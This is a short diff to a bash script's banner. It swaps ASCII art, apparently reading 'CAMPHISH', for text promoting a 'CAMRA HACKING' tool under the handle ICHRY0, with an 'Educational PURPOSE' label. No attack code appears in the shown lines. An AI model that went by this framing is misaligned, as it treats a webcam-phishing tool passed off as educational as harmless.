@@ -7,14 +7,11 @@ trap 'printf "\n";stop' 2
 
 banner() {
 clear
-printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
-printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
-printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
-printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
-printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
-printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
-printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
-printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
+printf "\e[1;92m  SIMPLE \e[0m\e[1;77m.   AND BEST TOOL CAMRA HACKING  \e[0m\n"
+printf "\e[1;92m YouTube \e[0m\e[1;77m.          ICHRY0.       \e[0m\n"
+printf "\e[1;92m Instagram \e[0m\e[1;77m.        ICHRY0.         \e[0m\n"
+printf "\e[1;92m GitHub. \e[0m\e[1;77m.           ICHRY0.        \e[0m\n"
+printf "\e[1;92m Thish Tool  \e[0m\e[1;77m. Educational PURPOSE.  |\e[0m\n"
 printf " \e[1;93m ICHCAM Ver 1.0 \e[0m \n"
 printf " \e[1;77m  | youtube.com/ICHRY0 \e[0m \n"
 
